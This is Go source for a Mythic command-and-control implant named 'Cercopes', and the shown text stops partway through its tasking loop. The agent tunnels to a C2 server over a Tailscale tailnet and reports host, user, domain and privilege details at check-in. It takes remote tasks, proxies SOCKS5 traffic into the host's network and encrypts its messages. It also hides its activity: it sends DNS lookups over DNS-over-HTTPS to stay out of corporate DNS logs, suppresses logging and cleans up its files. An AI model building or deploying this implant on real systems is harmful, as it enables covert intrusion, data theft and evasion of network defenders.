package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	mathrand "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"tailscale.com/ipn/store/mem"
	"tailscale.com/net/dnscache"
	"tailscale.com/tsnet"
)

// Build-time configuration (stamped by Mythic builder)
var (
	PayloadUUID      = "payload_uuid_here"
	AuthKey          = "auth_key_here"
	ControlURL       = "control_url_here"
	ServerHostname   = "mythic-c2"
	ServerPort       = "8080"
	CallbackInterval = "5"
	CallbackJitter   = "10"
	KillDate         = "-1"
	EncExchangeCheck = "T"
	AESPSKValue      = ""
	Protocol         = "http" // "http" or "tcp"
	TCPPort          = ""     // TCP port on the C2 server (used when Protocol == "tcp")
	DoHURL           = ""     // DNS-over-HTTPS resolver URL (empty = system DNS)
)

// ---------- Mythic message types ----------

type CheckinMessage struct {
	Action         string   `json:"action"`
	UUID           string   `json:"uuid"`
	IPs            []string `json:"ips"`
	OS             string   `json:"os"`
	User           string   `json:"user"`
	Host           string   `json:"host"`
	PID            int      `json:"pid"`
	Architecture   string   `json:"architecture"`
	Domain         string   `json:"domain"`
	IntegrityLevel int      `json:"integrity_level"`
	ProcessName    string   `json:"process_name"`
	ExternalIP     string   `json:"external_ip,omitempty"`
}

type CheckinResponse struct {
	Action string `json:"action"`
	ID     string `json:"id"`
	Status string `json:"status"`
}

type GetTaskingMessage struct {
	Action      string          `json:"action"`
	TaskingSize int             `json:"tasking_size"`
	Socks       []SocksDatagram `json:"socks,omitempty"`
	Responses   []TaskResponse  `json:"responses,omitempty"`
}

type GetTaskingResponse struct {
	Action    string          `json:"action"`
	Tasks     []Task          `json:"tasks"`
	Socks     []SocksDatagram `json:"socks"`
	Delegates json.RawMessage `json:"delegates,omitempty"`
}

type PostResponseMessage struct {
	Action    string          `json:"action"`
	Responses []TaskResponse  `json:"responses"`
	Socks     []SocksDatagram `json:"socks,omitempty"`
}

type PostResponseResponse struct {
	Action    string          `json:"action"`
	Socks     []SocksDatagram `json:"socks"`
	Responses json.RawMessage `json:"responses,omitempty"`
}

type Task struct {
	Command    string `json:"command"`
	Parameters string `json:"parameters"`
	ID         string `json:"id"`
	Timestamp  int64  `json:"timestamp"`
}

type TaskResponse struct {
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output,omitempty"`
	Completed  bool   `json:"completed"`
	Status     string `json:"status,omitempty"`
}

type SocksDatagram struct {
	ServerID int    `json:"server_id"`
	Data     string `json:"data"`
	Exit     bool   `json:"exit"`
	Port     int    `json:"port,omitempty"`
}

// ---------- SOCKS5 constants ----------

const (
	socks5Version = 0x05
	socksConnect  = 0x01
	socksIPv4     = 0x01
	socksDomain   = 0x03
	socksIPv6     = 0x04
	socksSuccess  = 0x00
	socksFailure  = 0x01
)

// ---------- SOCKS Manager ----------
// Mythic handles the SOCKS5 auth negotiation. The agent only receives
// CONNECT requests and relays data. Based on Poseidon's implementation.

type SocksManager struct {
	mu          sync.Mutex
	connections map[uint32]*socksConn
	outQueue    chan SocksDatagram
	// channels for thread-safe map operations
	addChan    chan socksAddMsg
	removeChan chan uint32
}

type socksConn struct {
	serverID uint32
	conn     net.Conn
	recvChan chan []byte // data from Mythic to write to target
}

type socksAddMsg struct {
	serverID uint32
	conn     net.Conn
	recvChan chan []byte
}

func NewSocksManager() *SocksManager {
	sm := &SocksManager{
		connections: make(map[uint32]*socksConn),
		outQueue:    make(chan SocksDatagram, 4096),
		addChan:     make(chan socksAddMsg, 100),
		removeChan:  make(chan uint32, 100),
	}
	go sm.manageConnections()
	return sm
}

// manageConnections serializes map access via channels (like Poseidon)
func (sm *SocksManager) manageConnections() {
	for {
		select {
		case add := <-sm.addChan:
			sm.connections[add.serverID] = &socksConn{
				serverID: add.serverID,
				conn:     add.conn,
				recvChan: add.recvChan,
			}
		case id := <-sm.removeChan:
			if sc, ok := sm.connections[id]; ok {
				close(sc.recvChan)
				if sc.conn != nil {
					sc.conn.Close()
				}
				delete(sm.connections, id)
			}
		}
	}
}

func (sm *SocksManager) Route(dg SocksDatagram) {
	if dg.Exit {
		log.Printf("[SOCKS] Exit for server_id %d", dg.ServerID)
		// Signal removal
		select {
		case sm.removeChan <- uint32(dg.ServerID):
		default:
		}
		return
	}

	data, err := base64.StdEncoding.DecodeString(dg.Data)
	if err != nil || len(data) == 0 {
		return
	}

	sm.mu.Lock()
	sc, exists := sm.connections[uint32(dg.ServerID)]
	sm.mu.Unlock()

	if exists {
		// Existing connection - send data to write goroutine
		select {
		case sc.recvChan <- data:
		case <-time.After(1 * time.Second):
			log.Printf("[SOCKS] Dropping data for server_id %d - channel full", dg.ServerID)
		}
		return
	}

	// New connection - first message should be SOCKS5 CONNECT
	// Mythic already handled auth negotiation
	if len(data) < 3 || data[0] != socks5Version {
		log.Printf("[SOCKS] Invalid SOCKS5 header for server_id %d: %x", dg.ServerID, data[:min(10, len(data))])
		sm.sendExit(dg.ServerID)
		return
	}

	go sm.handleConnect(uint32(dg.ServerID), data)
}

func (sm *SocksManager) handleConnect(serverID uint32, data []byte) {
	// Parse SOCKS5 CONNECT request
	// data[0] = version (0x05), data[1] = command, data[2] = reserved
	r := bytes.NewReader(data[3:]) // skip version, command, reserved

	// Read address type
	addrTypeByte, err := r.ReadByte()
	if err != nil {
		sm.sendFailureAndExit(int(serverID))
		return
	}

	var addr string
	switch addrTypeByte {
	case socksIPv4:
		ipBytes := make([]byte, 4)
		if _, err := io.ReadFull(r, ipBytes); err != nil {
			sm.sendFailureAndExit(int(serverID))
			return
		}
		addr = net.IP(ipBytes).String()
	case socksDomain:
		domainLen, err := r.ReadByte()
		if err != nil {
			sm.sendFailureAndExit(int(serverID))
			return
		}
		domainBytes := make([]byte, domainLen)
		if _, err := io.ReadFull(r, domainBytes); err != nil {
			sm.sendFailureAndExit(int(serverID))
			return
		}
		addr = string(domainBytes)
	case socksIPv6:
		ipBytes := make([]byte, 16)
		if _, err := io.ReadFull(r, ipBytes); err != nil {
			sm.sendFailureAndExit(int(serverID))
			return
		}
		addr = net.IP(ipBytes).String()
	default:
		log.Printf("[SOCKS] Unknown address type: %d", addrTypeByte)
		sm.sendFailureAndExit(int(serverID))
		return
	}

	// Read port (2 bytes big-endian)
	portBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, portBytes); err != nil {
		sm.sendFailureAndExit(int(serverID))
		return
	}
	port := binary.BigEndian.Uint16(portBytes)

	target := net.JoinHostPort(addr, strconv.Itoa(int(port)))
	log.Printf("[SOCKS] Connecting server_id %d -> %s", serverID, target)

	// Connect to target
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		log.Printf("[SOCKS] Connect failed for server_id %d -> %s: %v", serverID, target, err)
		sm.sendFailureAndExit(int(serverID))
		return
	}

	log.Printf("[SOCKS] Connected server_id %d -> %s", serverID, target)

	// Build success reply with bound address
	bindAddr := conn.LocalAddr().(*net.TCPAddr)
	reply := buildSocksReply(socksSuccess, bindAddr)
	sm.sendData(int(serverID), reply)

	// Register the connection
	recvChan := make(chan []byte, 200)
	sm.addChan <- socksAddMsg{
		serverID: serverID,
		conn:     conn,
		recvChan: recvChan,
	}

	// Start bidirectional relay
	go sm.readFromTarget(serverID, conn)
	go sm.writeToTarget(serverID, conn, recvChan)
}

func buildSocksReply(status byte, addr *net.TCPAddr) []byte {
	reply := []byte{socks5Version, status, 0x00}
	if addr != nil && addr.IP.To4() != nil {
		reply = append(reply, socksIPv4)
		reply = append(reply, addr.IP.To4()...)
	} else {
		reply = append(reply, socksIPv4, 0, 0, 0, 0)
	}
	portBytes := make([]byte, 2)
	if addr != nil {
		binary.BigEndian.PutUint16(portBytes, uint16(addr.Port))
	}
	reply = append(reply, portBytes...)
	return reply
}

func (sm *SocksManager) readFromTarget(serverID uint32, conn net.Conn) {
	buf := make([]byte, 65535)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			sm.sendData(int(serverID), data)
		}
		if err != nil {
			log.Printf("[SOCKS] Read done for server_id %d: %v", serverID, err)
			sm.sendExit(int(serverID))
			select {
			case sm.removeChan <- serverID:
			default:
			}
			return
		}
	}
}

func (sm *SocksManager) writeToTarget(serverID uint32, conn net.Conn, recvChan chan []byte) {
	for data := range recvChan {
		if _, err := conn.Write(data); err != nil {
			log.Printf("[SOCKS] Write failed for server_id %d: %v", serverID, err)
			sm.sendExit(int(serverID))
			select {
			case sm.removeChan <- serverID:
			default:
			}
			return
		}
	}
}

func (sm *SocksManager) sendData(serverID int, data []byte) {
	dg := SocksDatagram{
		ServerID: serverID,
		Data:     base64.StdEncoding.EncodeToString(data),
		Exit:     false,
	}
	select {
	case sm.outQueue <- dg:
	default:
		log.Printf("[SOCKS] Output queue full, dropping data for server_id %d", serverID)
	}
}

func (sm *SocksManager) sendFailureAndExit(serverID int) {
	reply := buildSocksReply(socksFailure, nil)
	sm.sendData(serverID, reply)
	sm.sendExit(serverID)
}

func (sm *SocksManager) sendExit(serverID int) {
	dg := SocksDatagram{
		ServerID: serverID,
		Data:     "",
		Exit:     true,
	}
	select {
	case sm.outQueue <- dg:
	default:
	}
}

func (sm *SocksManager) DrainQueue() []SocksDatagram {
	var datagrams []SocksDatagram
	for {
		select {
		case dg := <-sm.outQueue:
			datagrams = append(datagrams, dg)
		default:
			return datagrams
		}
	}
}

// ---------- Helpers ----------

// parsePathParam extracts "path" from JSON parameters, falls back to raw string
// parseParam extracts a single string parameter from Mythic's JSON parameters.
// Mythic sends parameters as a JSON object like {"command":"ls"} or {"path":"/"}.
// Tries the given keys in order (lowercase first, then capitalized).
func parseParam(params string, keys ...string) string {
	params = strings.TrimSpace(params)
	if params == "" {
		return ""
	}
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal([]byte(params), &parsed); err == nil {
		for _, key := range keys {
			if raw, ok := parsed[key]; ok {
				var s string
				if err := json.Unmarshal(raw, &s); err == nil && s != "" {
					return s
				}
			}
		}
		return ""
	}
	// Fall back to raw string
	return params
}

// ---------- AES-256-HMAC Encryption ----------

func aesEncrypt(key []byte, plaintext []byte) ([]byte, error) {
	if len(key) == 0 {
		return plaintext, nil
	}
	// key is 32 bytes: first 16 for HMAC, last 16 for AES... wait no
	// Mythic AES256-HMAC: key is 32 bytes total used as:
	//   AES key = full 32 bytes for AES-256
	//   HMAC key = full 32 bytes for HMAC-SHA256
	// Actually Mythic uses the SAME key for both AES and HMAC
	// Format: IV (16) + ciphertext + HMAC-SHA256 (32)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// PKCS7 padding
	blockSize := block.BlockSize()
	padding := blockSize - (len(plaintext) % blockSize)
	padded := append(plaintext, bytes.Repeat([]byte{byte(padding)}, padding)...)

	// Generate random IV
	iv := make([]byte, blockSize)
	if _, err := rand.Read(iv); err != nil {
		return nil, err
	}

	// Encrypt with CBC
	mode := cipher.NewCBCEncrypter(block, iv)
	ciphertext := make([]byte, len(padded))
	mode.CryptBlocks(ciphertext, padded)

	// IV + ciphertext
	result := append(iv, ciphertext...)

	// HMAC-SHA256
	mac := hmac.New(sha256.New, key)
	mac.Write(result)
	hmacSum := mac.Sum(nil)

	// Final: IV + ciphertext + HMAC
	return append(result, hmacSum...), nil
}

func aesDecrypt(key []byte, data []byte) ([]byte, error) {
	if len(key) == 0 {
		return data, nil
	}

	if len(data) < 48 { // 16 IV + 16 min ciphertext + 32 HMAC - actually just needs IV + HMAC minimum
		return nil, fmt.Errorf("ciphertext too short")
	}

	// Verify HMAC
	hmacStart := len(data) - 32
	messageData := data[:hmacStart]
	expectedMAC := data[hmacStart:]

	mac := hmac.New(sha256.New, key)
	mac.Write(messageData)
	if !hmac.Equal(mac.Sum(nil), expectedMAC) {
		return nil, fmt.Errorf("HMAC validation failed")
	}

	// Extract IV and ciphertext
	iv := messageData[:16]
	ciphertext := messageData[16:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS7 padding
	if len(plaintext) == 0 {
		return nil, fmt.Errorf("empty plaintext")
	}
	padding := int(plaintext[len(plaintext)-1])
	if padding > len(plaintext) || padding > aes.BlockSize {
		return nil, fmt.Errorf("invalid padding")
	}
	return plaintext[:len(plaintext)-padding], nil
}

// ---------- DNS-over-HTTPS ----------

// setupDoH configures selective DNS-over-HTTPS for Tailscale/Headscale domains only.
// Only domains matching *.tailscale.com or the control URL hostname are resolved via DoH.
// All other DNS queries use the system resolver so local/internal domains still work.
// This prevents queries for tailscale.com/DERP hostnames from appearing
// in corporate DNS logs. Must be called before tsnet.Up().
func setupDoH(dohURL, controlURL string) {
	if dohURL == "" {
		return
	}

	// Build the set of domains to resolve via DoH.
	// Everything else falls through to the system resolver.
	dohDomains := []string{".tailscale.com"}
	if controlURL != "" {
		// Extract hostname from the control URL (e.g. "https://headscale.example.com")
		// so headscale domains are also routed through DoH.
		if h := extractHost(controlURL); h != "" && !strings.HasSuffix(h, ".tailscale.com") {
			dohDomains = append(dohDomains, h)
		}
	}

	// HTTP client used solely for DoH queries — uses IP-literal DoH endpoints
	// (e.g., 1.1.1.1) so no DNS is needed to reach the resolver itself.
	dohTransport := &http.Transport{
		DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
	}
	dohClient := &http.Client{Timeout: 5 * time.Second, Transport: dohTransport}

	// DoH resolver — only used for matching domains
	dohResolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			return &dohConn{
				ctx:       ctx,
				dohURL:    dohURL,
				dohClient: dohClient,
			}, nil
		},
	}

	shouldDoH := func(host string) bool {
		lower := strings.ToLower(host)
		for _, d := range dohDomains {
			if strings.HasSuffix(lower, d) || lower == strings.TrimPrefix(d, ".") {
				return true
			}
		}
		return false
	}

	// Override the process-wide default resolver so that direct net.LookupHost
	// calls also go through DoH.
	systemResolver := *net.DefaultResolver // snapshot the current system resolver
	net.DefaultResolver = dohResolver

	// Patch the dnscache singleton — this is the actual resolver used by tsnet's
	// controlhttp (controlplane.tailscale.com) and logpolicy (log.tailscale.com).
	// The singleton is created at package init with &net.Resolver{} (nil Dial),
	// which bypasses net.DefaultResolver entirely. Replacing .Forward forces all
	// dnscache lookups through our DoH resolver.
	dnscache.Get().Forward = dohResolver

	// resolveHost resolves a hostname, using DoH for Tailscale domains and
	// system DNS for everything else.
	resolveHost := func(ctx context.Context, host string) (string, error) {
		if shouldDoH(host) {
			ips, err := dohResolver.LookupHost(ctx, host)
			if err != nil {
				return "", fmt.Errorf("DoH resolve %s: %w", host, err)
			}
			return ips[0], nil
		}
		ips, err := systemResolver.LookupHost(ctx, host)
		if err != nil {
			return "", err
		}
		return ips[0], nil
	}

	// Patch http.DefaultTransport so tsnet's internal HTTP clients resolve
	// Tailscale/Headscale hostnames via DoH. All other domains use system DNS.
	baseTransport, ok := http.DefaultTransport.(*http.Transport)
	if !ok {
		baseTransport = &http.Transport{}
	}
	patched := baseTransport.Clone()
	patched.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, addr)
		}
		if net.ParseIP(host) != nil {
			return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, addr)
		}
		ip, err := resolveHost(ctx, host)
		if err != nil {
			return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, addr)
		}
		return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, net.JoinHostPort(ip, port))
	}

	http.DefaultTransport = patched

	log.Printf("[*] DNS-over-HTTPS enabled: %s (domains: %v)", dohURL, dohDomains)
}

// extractHost returns the hostname from a URL string (without port).
func extractHost(rawURL string) string {
	// Strip scheme
	u := rawURL
	if idx := strings.Index(u, "://"); idx >= 0 {
		u = u[idx+3:]
	}
	// Strip path
	if idx := strings.Index(u, "/"); idx >= 0 {
		u = u[:idx]
	}
	// Strip port
	if host, _, err := net.SplitHostPort(u); err == nil {
		return host
	}
	return u
}

// dohConn implements net.Conn to intercept DNS queries and forward them via DoH.
// Go's resolver writes a raw DNS wire-format query and reads the response.
type dohConn struct {
	ctx       context.Context
	dohURL    string
	dohClient *http.Client
	resp      []byte // buffered response
	readPos   int
}

func (c *dohConn) Write(b []byte) (int, error) {
	// b contains the raw DNS wire-format query
	req, err := http.NewRequestWithContext(c.ctx, "POST", c.dohURL, bytes.NewReader(b))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/dns-message")
	req.Header.Set("Accept", "application/dns-message")

	resp, err := c.dohClient.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	c.resp, err = io.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}
	c.readPos = 0
	return len(b), nil
}

func (c *dohConn) Read(b []byte) (int, error) {
	if c.readPos >= len(c.resp) {
		return 0, errors.New("no data")
	}
	n := copy(b, c.resp[c.readPos:])
	c.readPos += n
	return n, nil
}

func (c *dohConn) Close() error                       { return nil }
func (c *dohConn) LocalAddr() net.Addr                { return nil }
func (c *dohConn) RemoteAddr() net.Addr               { return nil }
func (c *dohConn) SetDeadline(t time.Time) error      { return nil }
func (c *dohConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *dohConn) SetWriteDeadline(t time.Time) error { return nil }

// ---------- Agent ----------

type Agent struct {
	payloadUUID string
	callbackID  string // assigned after checkin
	interval    int
	jitter      float64
	httpClient  *http.Client
	serverURL   string
	socks       *SocksManager
	tsServer    *tsnet.Server
	aesKey      []byte // AES-256 encryption key (nil = no encryption)
	protocol    string // "http" or "tcp"
	tcpConn     net.Conn
	tcpMu       sync.Mutex
}

func NewAgent() *Agent {
	interval, _ := strconv.Atoi(CallbackInterval)
	if interval <= 0 {
		interval = 5
	}
	jitter, _ := strconv.ParseFloat(CallbackJitter, 64)
	if jitter < 0 || jitter > 100 {
		jitter = 10
	}

	// Decode AES PSK if provided (base64-encoded 32-byte key)
	var aesKey []byte
	if AESPSKValue != "" {
		var err error
		aesKey, err = base64.StdEncoding.DecodeString(AESPSKValue)
		if err != nil || len(aesKey) != 32 {
			log.Printf("[!] Invalid AES key (len=%d, err=%v), disabling encryption", len(aesKey), err)
			aesKey = nil
		}
	}

	return &Agent{
		payloadUUID: PayloadUUID,
		interval:    interval,
		jitter:      jitter,
		socks:       NewSocksManager(),
		aesKey:      aesKey,
		protocol:    Protocol,
	}
}

func (a *Agent) Start() {
	// Enable debug logging to stderr
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds)
	log.SetOutput(os.Stderr)

	log.Printf("[*] Cercopes agent starting (UUID: %s)", a.payloadUUID)
	log.Printf("[*] AuthKey: %s...%s", AuthKey[:10], AuthKey[len(AuthKey)-4:])
	log.Printf("[*] ControlURL: %s", ControlURL)
	log.Printf("[*] ServerHostname: %s, ServerPort: %s", ServerHostname, ServerPort)
	log.Printf("[*] Interval: %d, Jitter: %.0f%%", a.interval, a.jitter)
	log.Printf("[*] Protocol: %s", a.protocol)
	if a.protocol == "tcp" {
		log.Printf("[*] TCPPort: %s", TCPPort)
	}

	// Override DNS for Tailscale/Headscale domains with DNS-over-HTTPS before any network calls
	setupDoH(DoHURL, ControlURL)

	// Start tsnet — use a temp dir to avoid writing to default user-config paths
	// (e.g. %APPDATA%\tsnet-<hostname> on Windows), cleaned up on exit.
	tsDir, err := os.MkdirTemp("", "ts-")
	if err != nil {
		log.Fatalf("[!] Failed to create temp dir for tsnet: %v", err)
	}
	defer os.RemoveAll(tsDir)

	a.tsServer = &tsnet.Server{
		Dir:       tsDir,
		Hostname:  fmt.Sprintf("agent-%s", a.payloadUUID[:8]),
		AuthKey:   AuthKey,
		Ephemeral: true,
		Store:     new(mem.Store),
		Logf:      func(string, ...any) {}, // suppress disk logging
	}
	if ControlURL != "" {
		a.tsServer.ControlURL = ControlURL
	}

	log.Printf("[*] Waiting for tsnet to be ready...")

	// Wait for tsnet to be connected before creating HTTP client
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	status, err := a.tsServer.Up(ctx)
	if err != nil {
		log.Fatalf("[!] tsnet.Up failed: %v", err)
	}
	log.Printf("[+] tsnet is up! Tailscale IP: %v", status.TailscaleIPs)

	if a.protocol == "tcp" {
		// TCP mode: dial the C2 server's TCP port through the tailnet
		port := TCPPort
		if port == "" {
			port = ServerPort
		}
		log.Printf("[*] Connecting TCP to %s:%s", ServerHostname, port)
		if err := a.tcpDial(ServerHostname, port); err != nil {
			log.Fatalf("[!] TCP dial failed: %v", err)
		}
		log.Printf("[+] TCP connection established")
	} else {
		// HTTP mode: create HTTP client routed through tailnet
		tsHTTPClient := a.tsServer.HTTPClient()
		a.httpClient = tsHTTPClient
		a.serverURL = fmt.Sprintf("http://%s:%s/agent_message", ServerHostname, ServerPort)
		log.Printf("[*] Server URL: %s", a.serverURL)
	}

	// Checkin
	for {
		log.Printf("[*] Attempting checkin...")
		if a.checkin() {
			log.Printf("[+] Checkin successful! Callback ID: %s", a.callbackID)
			break
		}
		log.Printf("[!] Checkin failed, retrying after sleep...")
		a.sleep()
	}

	// Main tasking loop
	log.Printf("[*] Entering tasking loop")
	a.taskingLoop()
}

func (a *Agent) currentUUID() string {
	if a.callbackID != "" {
		return a.callbackID
	}
	return a.payloadUUID
}

func (a *Agent) sendMessage(msgJSON []byte) ([]byte, error) {
	// Optionally encrypt the JSON payload
	payload := msgJSON
	if a.aesKey != nil {
		var err error
		payload, err = aesEncrypt(a.aesKey, msgJSON)
		if err != nil {
			log.Printf("[!] AES encrypt failed: %v", err)
			return nil, fmt.Errorf("encrypt failed: %w", err)
		}
	}

	// Mythic message format: base64(UUID + payload)
	raw := append([]byte(a.currentUUID()), payload...)
	body := base64.StdEncoding.EncodeToString(raw)

	var respBody []byte
	var err error

	if a.protocol == "tcp" {
		respBody, err = a.sendTCP([]byte(body))
	} else {
		respBody, err = a.sendHTTP(body)
	}
	if err != nil {
		return nil, err
	}

	// Response format: base64(UUID + payload)
	respStr := string(respBody)
	decoded, err := base64.StdEncoding.DecodeString(respStr)
	if err != nil {
		log.Printf("[!] Base64 decode failed: %v (raw: %s)", err, respStr[:min(100, len(respStr))])
		return nil, fmt.Errorf("base64 decode failed: %w", err)
	}

	if len(decoded) < 36 {
		log.Printf("[!] Decoded response too short (%d bytes): %s", len(decoded), string(decoded))
		return nil, fmt.Errorf("response too short: %s", string(decoded))
	}

	// Skip the UUID prefix (36 bytes)
	respPayload := decoded[36:]

	// Optionally decrypt
	if a.aesKey != nil {
		respPayload, err = aesDecrypt(a.aesKey, respPayload)
		if err != nil {
			log.Printf("[!] AES decrypt failed: %v", err)
			return nil, fmt.Errorf("decrypt failed: %w", err)
		}
	}

	log.Printf("[<] Decoded response: %s", string(respPayload))
	return respPayload, nil
}

func (a *Agent) sendHTTP(body string) ([]byte, error) {
	log.Printf("[>] POST %s (UUID: %s, encrypted: %v, body len: %d)", a.serverURL, a.currentUUID(), a.aesKey != nil, len(body))

	resp, err := a.httpClient.Post(a.serverURL, "application/octet-stream", strings.NewReader(body))
	if err != nil {
		log.Printf("[!] POST failed: %v", err)
		return nil, fmt.Errorf("POST failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[!] Read response failed: %v", err)
		return nil, fmt.Errorf("read response failed: %w", err)
	}

	log.Printf("[<] HTTP %d, response len: %d", resp.StatusCode, len(respBody))

	if resp.StatusCode != 200 {
		log.Printf("[!] Non-200 response: %s", string(respBody))
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
	}

	return respBody, nil
}

// tcpDial connects to the C2 server's TCP port through the tailnet.
func (a *Agent) tcpDial(hostname, port string) error {
	conn, err := a.tsServer.Dial(context.Background(), "tcp", net.JoinHostPort(hostname, port))
	if err != nil {
		return err
	}
	a.tcpConn = conn
	return nil
}

// tcpReconnect re-establishes the TCP connection.
func (a *Agent) tcpReconnect() error {
	if a.tcpConn != nil {
		a.tcpConn.Close()
	}
	port := TCPPort
	if port == "" {
		port = ServerPort
	}
	log.Printf("[TCP] Reconnecting to %s:%s", ServerHostname, port)
	return a.tcpDial(ServerHostname, port)
}

// sendTCP sends a message over the persistent TCP connection using length-prefixed framing.
// Protocol: [4-byte big-endian length][payload]
func (a *Agent) sendTCP(body []byte) ([]byte, error) {
	a.tcpMu.Lock()
	defer a.tcpMu.Unlock()

	for attempt := 0; attempt < 2; attempt++ {
		if a.tcpConn == nil {
			if err := a.tcpReconnect(); err != nil {
				return nil, fmt.Errorf("TCP reconnect failed: %w", err)
			}
		}

		log.Printf("[TCP>] Sending %d bytes (UUID: %s)", len(body), a.currentUUID())

		// Write length header + payload
		if err := binary.Write(a.tcpConn, binary.BigEndian, uint32(len(body))); err != nil {
			log.Printf("[TCP] Write length failed: %v, reconnecting...", err)
			a.tcpConn = nil
			continue
		}
		if _, err := a.tcpConn.Write(body); err != nil {
			log.Printf("[TCP] Write payload failed: %v, reconnecting...", err)
			a.tcpConn = nil
			continue
		}

		// Read response length
		var respLen uint32
		if err := binary.Read(a.tcpConn, binary.BigEndian, &respLen); err != nil {
			log.Printf("[TCP] Read response length failed: %v, reconnecting...", err)
			a.tcpConn = nil
			continue
		}

		if respLen == 0 {
			return nil, fmt.Errorf("TCP: server returned zero-length response (error)")
		}
		if respLen > 16*1024*1024 {
			a.tcpConn = nil
			return nil, fmt.Errorf("TCP: response too large (%d bytes)", respLen)
		}

		// Read response payload
		respBody := make([]byte, respLen)
		if _, err := io.ReadFull(a.tcpConn, respBody); err != nil {
			log.Printf("[TCP] Read response payload failed: %v, reconnecting...", err)
			a.tcpConn = nil
			continue
		}

		log.Printf("[TCP<] Received %d bytes", len(respBody))
		return respBody, nil
	}

	return nil, fmt.Errorf("TCP: failed after reconnect")
}

func (a *Agent) checkin() bool {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	domain := ""
	if currentUser != nil {
		username = currentUser.Username
		// Handle DOMAIN\user on Windows
		if parts := strings.SplitN(username, "\\", 2); len(parts) == 2 {
			domain = parts[0]
			username = parts[1]
		}
		// Handle user@domain on Linux
		if parts := strings.SplitN(username, "@", 2); len(parts) == 2 && domain == "" {
			username = parts[0]
			domain = parts[1]
		}
	}

	ips := getLocalIPs()

	// Build OS string with version info
	osInfo := getOSInfo()

	// Detect integrity level
	integrityLevel := getIntegrityLevel()

	// Get process name (basename only)
	procName := filepath.Base(os.Args[0])

	msg := CheckinMessage{
		Action:         "checkin",
		UUID:           a.payloadUUID,
		IPs:            ips,
		OS:             osInfo,
		User:           username,
		Host:           hostname,
		PID:            os.Getpid(),
		Architecture:   runtime.GOARCH,
		Domain:         domain,
		IntegrityLevel: integrityLevel,
		ProcessName:    procName,
		ExternalIP:     getExternalIP(),
	}

	msgJSON, _ := json.Marshal(msg)
	respJSON, err := a.sendMessage(msgJSON)
	if err != nil {
		return false
	}

	var resp CheckinResponse
	if err := json.Unmarshal(respJSON, &resp); err != nil {
		return false
	}

	if resp.Status == "success" && resp.ID != "" {
		a.callbackID = resp.ID
		return true
	}

	return false
}

func getOSInfo() string {
	switch runtime.GOOS {
	case "linux":
		// Try to read os-release for distro info
		data, err := os.ReadFile("/etc/os-release")
		if err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "PRETTY_NAME=") {
					name := strings.TrimPrefix(line, "PRETTY_NAME=")
					name = strings.Trim(name, "\"")
					return name
				}
			}
		}
		return "Linux"
	case "darwin":
		out, err := exec.Command("sw_vers", "-productVersion").Output()
		if err == nil {
			return "macOS " + strings.TrimSpace(string(out))
		}
		return "macOS"
	case "windows":
		out, err := exec.Command("cmd.exe", "/C", "ver").Output()
		if err == nil {
			return strings.TrimSpace(string(out))
		}
		return "Windows"
	default:
		return runtime.GOOS
	}
}

func getIntegrityLevel() int {
	if runtime.GOOS == "windows" {
		// Would need Windows API calls for proper detection
		return 2 // medium
	}
	if os.Geteuid() == 0 {
		return 4 // high (root)
	}
	return 2 // medium
}

func getExternalIP() string {
	// External IP is populated server-side by Mythic based on the source connection
	return ""
}

func (a *Agent) taskingLoop() {
	for {
		a.sleep()

		// Collect outgoing SOCKS data
		socksOut := a.socks.DrainQueue()

		// Get tasking
		msg := GetTaskingMessage{
			Action:      "get_tasking",
			TaskingSize: -1,
			Socks:       socksOut,
		}

		msgJSON, _ := json.Marshal(msg)
		respJSON, err := a.sendMessage(msgJSON)
		if err != nil {
			continue
		}

		var resp GetTaskingResponse
		if err := json.Unmarshal(respJSON, &resp); err != nil {
			continue
		}

		// Process incoming SOCKS data
		if len(resp.Socks) > 0 {
			log.Printf("[SOCKS] Received %d datagrams from Mythic", len(resp.Socks))
		}
		for _, dg := range resp.Socks {
			a.socks.Route(dg)
		}

		// Process tasks
		var responses []TaskResponse
		for _, task := range resp.Tasks {
			tr := a.handleTask(task)
			responses = append(responses, tr)
		}

		// Post responses if we have any, OR if we have SOCKS data to send back
		socksOut = a.socks.DrainQueue()
		if len(responses) > 0 || len(socksOut) > 0 {
			if len(socksOut) > 0 {
				log.Printf("[SOCKS] Sending %d datagrams to Mythic", len(socksOut))
			}
			postMsg := PostResponseMessage{
				Action:    "post_response",
				Responses: responses,
				Socks:     socksOut,
